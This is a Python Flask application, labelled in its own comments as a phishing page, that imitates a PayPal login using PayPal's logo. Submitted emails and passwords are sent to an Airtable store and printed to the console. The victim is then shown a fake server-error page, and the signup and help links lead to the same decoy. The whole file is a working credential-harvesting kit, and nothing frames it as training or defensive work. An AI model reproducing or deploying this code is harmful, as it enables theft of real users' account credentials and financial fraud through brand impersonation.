from flask import Flask, request, render_template_string, redirect, url_for
from save_data import save_to_airtable  # Import the function from data.py

app = Flask(__name__)

# Basic HTML template for phishing page with embedded CSS
phishing_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            color: #333;
        }

        .login-form {
            padding: 20px;
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        .login-form img {
            width: 120px;
            margin-bottom: 20px;
        }

        input[type="email"],
        input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #0056b3;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        input[type="submit"]:hover {
            background-color: #004494;
        }

        a {
            display: block;
            margin-top: 15px;
            color: #007bff;
            text-decoration: underline;
            cursor: pointer;
        }

        a:hover {
            color: #0056b3;
        }

        .signup-btn {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #d3d3d3;
            color: black;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .signup-btn:hover {
            background-color: #b0b0b0;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <img src="static/paypal-logo.png" alt="PayPal Logo">
        <form action="/login" method="post">
            <input type="email" id="email" name="email" placeholder="Email" autocomplete="off" required>
            <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
            <input type="submit" value="Login">
        </form>
        <a href="/server-issue">Having trouble logging in?</a>
        <button class="signup-btn" onclick="window.location.href='/signup'">Sign Up</button>
    </div>
</body>
</html>
"""

# Template for the server cloud issue page
server_issue_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Server Cloud Issue</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }

        .message {
            background-color: white; 
            padding: 20px; 
            border-radius: 8px; 
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        img {
            width: 120px;
            margin-bottom: 20px;
        }

        p {
           margin-bottom: 20px; 
        }
        
        .card-title {
            font-size: 24px;
        }
        
        .card-text {
            font-size: 20px;
            color:#555; 
        }

        .try-again-btn {
           padding: 10px 20px; 
           border-radius: 4px; 
           background-color:#007bff;
           color:white; 
           border:none; 
           cursor:pointer; 
           font-size:16px; 
           transition:bg-color .3s; 
           width: 100%;
           font-weight: bolder;
       }
       
       .try-again-btn:hover {
           background-color:#0056b3;
       }
    </style>
</head>
<body>
    <div class="message">
        <img src="static/paypal-logo.png" alt="PayPal Logo">
        <p class="card-title">We're Sorry</p>
        <p class="card-text">Things don't appear to be working right now.</p>
        <button class="try-again-btn" onclick="window.location.href='/'">Try Again</button> 
    </div>
</body>
</html>
"""

# Route for phishing page
@app.route('/')
def index():
    return render_template_string(phishing_page)

# Route to handle form submission
@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Save the credentials to Airtable using the function from data.py
    status_code, response_content = save_to_airtable(email, password)
    
    if status_code == 200:
        print(f"Credentials saved: Email: {email}, Password: {password}")
    else:
        print(f"Error saving credentials: {response_content}")
    
    return render_template_string(server_issue_page)

# Route for server cloud issue page
@app.route('/server-issue')
def server_issue():
    return render_template_string(server_issue_page)

# Route for signup page leading to the same server cloud issue
@app.route('/signup')
def signup():
    return render_template_string(server_issue_page)

if __name__ == "__main__":
    app.run(debug=True)
